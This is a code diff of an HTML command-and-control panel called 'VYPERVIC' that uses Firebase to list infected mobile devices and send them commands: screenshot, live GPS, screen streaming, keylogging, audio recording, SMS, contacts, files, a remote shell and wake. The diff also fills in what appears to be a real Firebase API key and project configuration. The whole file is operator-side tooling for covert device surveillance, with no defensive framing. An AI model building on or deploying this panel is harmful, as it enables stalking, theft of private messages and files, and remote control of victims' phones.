@@ -1,82 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>VYPERVIC: C2</title>
-    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-database-compat.js"></script>
+    <title>VYPERVIC: C2 PANEL</title>
+    <script type="module">
+        // 🔥 YOUR FIREBASE CONFIG EMBEDDED ✅
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js';
+        import { getDatabase, ref, onValue, set } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';
+        
+        const firebaseConfig = {
+            apiKey: "AIzaSyAWnwGiYnpn34ZOB1-99KaXbnqoQAfPOyI",
+            authDomain: "vypervic-c2.firebaseapp.com",
+            projectId: "vypervic-c2",
+            storageBucket: "vypervic-c2.firebasestorage.app",
+            messagingSenderId: "86010863857",
+            appId: "1:86010863857:web:59e42bfb530c5325348950"
+        };
+        
+        const app = initializeApp(firebaseConfig);
+        window.db = getDatabase(app);
+    </script>
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
-        h1 { text-align: center; color: #ff0000; font-size: 48px; text-shadow: 0 0 20px #ff0000; }
-        .device { background: #111; padding: 20px; margin: 10px; border: 2px solid #00ff00; }
-        .btn { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 8px 16px; margin: 4px; cursor: pointer; font-family: monospace; }
-        .btn:hover { background: #00ff00 !important; color: #000 !important; }
-        .btn.active { background: #ff0000 !important; color: #fff !important; }
-        .logs { background: #000; color: #0f0; height: 200px; overflow: auto; font-size: 12px; border: 1px solid #333; padding: 10px; margin-top: 20px; }
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:linear-gradient(45deg,#000,#001100);color:#00ff00;font-family:'Courier New',monospace;min-height:100vh;padding:20px;}
+        h1{text-align:center;color:#ff0000;font-size:4rem;text-shadow:0 0 30px #ff0000;margin-bottom:30px;animation:glow 2s ease-in-out infinite alternate;}
+        @keyframes glow{from{text-shadow:0 0 20px #ff0000;}to{text-shadow:0 0 40px #ff0000,0 0 60px #ff0000;}}
+        .container{max-width:1400px;margin:0 auto;}
+        .status-bar{background:#111;padding:15px;border:2px solid #00ff00;margin-bottom:20px;border-radius:10px;text-align:center;font-size:1.2rem;}
+        .device-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px;margin-bottom:20px;}
+        .device{background:rgba(17,17,17,0.9);padding:25px;border:2px solid #00ff00;border-radius:15px;box-shadow:0 0 20px rgba(0,255,0,0.3);}
+        .device h3{color:#ffff00;margin-bottom:20px;text-align:center;font-size:1.4rem;}
+        .btn-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
+        .btn{background:#222;color:#00ff00;border:2px solid #00ff00;padding:12px 8px;cursor:pointer;font-family:inherit;font-size:0.9rem;border-radius:8px;transition:all 0.3s;text-transform:uppercase;font-weight:bold;}
+        .btn:hover{background:#00ff00!important;color:#000!important;box-shadow:0 0 15px #00ff00;transform:scale(1.05);}
+        .btn:active{transform:scale(0.98);}
+        .logs{background:#000;color:#0f0;height:250px;overflow-y:auto;font-size:11px;border:2px solid #333;padding:15px;margin-top:20px;border-radius:10px;white-space:pre-wrap;font-family:monospace;}
+        .online{border-color:#00ff00!important;box-shadow:0 0 20px #00ff00!important;}
+        .offline{border-color:#666;opacity:0.5;}
     </style>
 </head>
 <body>
-    <h1>🔥 VYPERVIC: C2 PANEL 🔥</h1>
-    
-    <div id="devices"></div>
-    <div id="logs" class="logs"></div>
+    <div class="container">
+        <h1>🔥 VYPERVIC: C2 PANEL 🔥</h1>
+        <div class="status-bar" id="status">Status: Waiting for devices... | Online: 0</div>
+        <div class="device-grid" id="devices"></div>
+        <div class="logs" id="logs">[SYSTEM] VYPERVIC C2 Panel Initialized&#10;[SYSTEM] Firebase Connected - Ready for devices</div>
+    </div>
 
-    <script>
-        // REPLACE WITH YOUR FIREBASE CONFIG
-        const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_PROJECT.firebaseapp.com",
-            databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com/",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT.appspot.com",
-            messagingSenderId: "123456789",
-            appId: "YOUR_APP_ID"
-        };
+    <script type="module">
+        import { ref, onValue, set } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';
+        const db = window.db;
+        const devicesRef = ref(db, 'devices');
         
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const logsRef = db.ref('logs');
-        
-        function addLog(msg) {
-            const now = new Date().toLocaleTimeString();
-            document.getElementById('logs').innerHTML += `[${now}] ${msg}\n`;
-            document.getElementById('logs').scrollTop = document.getElementById('logs').scrollHeight;
+        function addLog(message) {
+            const timestamp = new Date().toLocaleString();
+            const logEntry = `[${timestamp}] ${message}`;
+            const logsEl = document.getElementById('logs');
+            logsEl.innerHTML += `<div>${logEntry}</div>`;
+            logsEl.scrollTop = logsEl.scrollHeight;
+            set(ref(db, `logs/${Date.now()}`), logEntry);
         }
         
-        // Load devices & render buttons
-        db.ref('devices').on('value', snapshot => {
+        onValue(devicesRef, (snapshot) => {
             const devices = snapshot.val();
+            const deviceGrid = document.getElementById('devices');
             let html = '';
+            let onlineCount = 0;
+            
             if (devices) {
-                Object.keys(devices).forEach(deviceId => {
+                Object.entries(devices).forEach(([deviceId, data]) => {
+                    const isOnline = data.lastSeen && (Date.now() - data.lastSeen < 30000);
+                    if (isOnline) onlineCount++;
                     html += `
-                        <div class="device">
-                            <h3>📱 Device: ${deviceId.slice(0,16)}...</h3>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'screenshot')">📸 Screenshot</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'gps')">📍 Live GPS</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'screen')">🖥️ Screen Stream</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'keylog')">⌨️ Keylogger</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'audio')">🎤 Record Audio</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'shell')">💻 Shell Command</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'sms')">📱 SMS</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'contacts')">👥 Contacts</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'files')">📁 Files</button>
-                            <button class="btn" onclick="sendCommand('${deviceId}', 'wake')">⏰ Wake Device</button>
-                            <!-- +15 more buttons... -->
-                        </div>
-                    `;
+                        <div class="device ${isOnline ? 'online' : 'offline'}">
+                            <h3>📱 ${deviceId.slice(0,16)}... 
+                                <span style="font-size:0.8rem;color:${isOnline ? '#00ff00' : '#ff4444'}">
+                                    ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'}
+                                </span>
+                            </h3>
+                            <div class="btn-grid">
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'screenshot')">📸 Screenshot</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'gps')">📍 GPS</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'screen')">🖥️ Screen</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'keylog')">⌨️ Keylog</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'audio')">🎤 Audio</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'sms')">📱 SMS</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'contacts')">👥 Contacts</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'files')">📁 Files</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'shell')">💻 Shell</button>
+                                <button class="btn" onclick="sendCmd('${deviceId}', 'wake')">⏰ Wake</button>
+                            </div>
+                        </div>`;
                 });
-            } else {
-                html = '<p>No devices online</p>';
-            }
-            document.getElementById('devices').innerHTML = html;
+            } else html = '<div class="device offline"><h3>No devices connected</h3></div>';
+            
+            deviceGrid.innerHTML = html;
+            document.getElementById('status').innerHTML = `Status: ${onlineCount} device${onlineCount!==1?'s':''} online | Total: ${Object.keys(devices||{}).length}`;
+            addLog(`${onlineCount} devices online`);
         });
         
-        function sendCommand(deviceId, cmd) {
-            db.ref(`devices/${deviceId}/commands/${cmd}`).set(Date.now());
-            addLog(`Command "${cmd}" sent to ${deviceId}`);
-            event.target.classList.add('active');
-            setTimeout(() => event.target.classList.remove('active'), 1000);
-        }
+        window.sendCmd = (deviceId, cmd) => {
+            set(ref(db, `devices/${deviceId}/commands/${cmd}`), Date.now())
+                .then(() => addLog(`✅ "${cmd}" → ${deviceId}`))
+                .catch(err => addLog(`❌ Error: ${err.message}`));
+        };
     </script>
 </body>
 </html>
